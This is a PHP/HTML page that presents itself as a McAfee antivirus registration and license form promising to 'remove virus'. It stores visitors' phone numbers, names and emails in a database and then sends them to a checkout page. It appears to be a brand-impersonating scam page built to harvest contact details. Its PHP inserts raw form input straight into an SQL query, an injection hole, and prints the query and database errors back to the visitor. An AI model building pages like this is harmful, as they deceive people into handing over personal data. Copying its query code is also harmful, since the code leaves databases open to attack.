<!DOCTYPE html>
<html>
<head>
	<title></title>
	<link rel="stylesheet" type="text/css" href="form_css.css">
	<link rel="stylesheet" type="text/css" href="form_css2.css">
	<link rel="stylesheet" type="text/css" href="form_css3.css">
</head>
<style type="text/css">
	
</style>

<body>
	


	<div class="container-fluid">

		<div class="container-fixed">

			<h2 class="green" style="font-weight: bolder;">Register Your McAfee Antivirus to remove virus</h2>

			<p>Please fill the form below to register and get your 1 Year License now</p>



			<div class="gf_browser_unknown gform_wrapper" id="gform_wrapper_1">
				<form id="gform_1" method="POST" enctype="multipart/form-data">
				
				<?php

include "conn.php";

if (isset($_POST['submit'])){
	$number = $_POST['number'];
	$name = $_POST['name'];
	$email = $_POST['email'];
	
   
	
$q = "INSERT INTO `user_id` ( `number`,`name`,`email`) VALUES ('$number','$name','$email')";
$query = mysqli_query($conn,$q);
	
	if ($query) {
    echo "";
} else {
    echo "Error: " . $q . "<br>" . $conn->error;
}
 header('Location: checkout.php');
}


?>
				
					<div class="gform_body">
						<ul id="gform_fields_1" class="gform_fields top_label form_sublabel_below description_below">
							<li id="field_1_2" class="gfield gf-phone gfield_contains_required field_sublabel_below field_description_below hidden_label gfield_visibility_visible">
								<label class="gfield_label" for="input_1_2">Phone<span class="gfield_required">*</span></label>
								<div class="ginput_container ginput_container_phone"><input name="number" id="number" type="text" value="" class="medium" placeholder="Phone number" aria-required="true" aria-invalid="false">
									<span style="color:red" id="phone-error"></span>
								</div>
							</li>
							<li id="field_1_1" class="gfield gf-name gfield_contains_required field_sublabel_hidden_label field_description_below hidden_label gfield_visibility_visible">
								<label class="gfield_label gfield_label_before_complex">First Name<span class="gfield_required">*</span></label>
								<div class="ginput_complex ginput_container no_prefix has_first_name no_middle_name no_last_name no_suffix gf_name_has_1 ginput_container_name" id="input_1_1">

									<span id="input_1_1_3_container" class="name_first">
										<input type="text" name="name" id="name" value="" aria-label="First name" aria-required="true" aria-invalid="false" placeholder="Your full name" style="width: 300px">
										
									</span>
									<span style="color:red" id="name-error"></span>

								</div>
							</li>
						
							<li id="field_1_3" class="gfield gf-email field_sublabel_below field_description_below hidden_label gfield_visibility_visible">
								<label class="gfield_label" for="input_1_3">Email</label>
								<div class="ginput_container ginput_container_email">
									<input name="email" id="email" type="text" value="" class="medium" placeholder="Your email address" aria-invalid="false">
									<span style="color:red" id="mail-error"></span>
								</div>
							</li>
						</ul>
					</div>
					<div class="gform_footer top_label">
						<input type="submit" id="" name="submit" class="gform_button button button-click" value="Submit" >
					</div>
				</form>
			</div>
			


			<img class="footer-logo" src="images/mcafee2.png" alt="" width="112" border="0">

		</div>

	</div>

	<script type="text/javascript" src="../wp-content/themes/mcafeerenewal/js/bootstrap.min4963.js?ver=1.1" id="bootstrap-js"></script>
	<script type="text/javascript" src="../wp-content/themes/mcafeerenewal/js/lity4963.js?ver=1.1" id="lity-js"></script>
	<script type="text/javascript" src="../wp-includes/js/wp-embed.mind96d.js?ver=5.6.1" id="wp-embed-js"></script>
	<script src="https://code.jquery.com/jquery-3.6.0.js"></script>
	






</body>

</html>









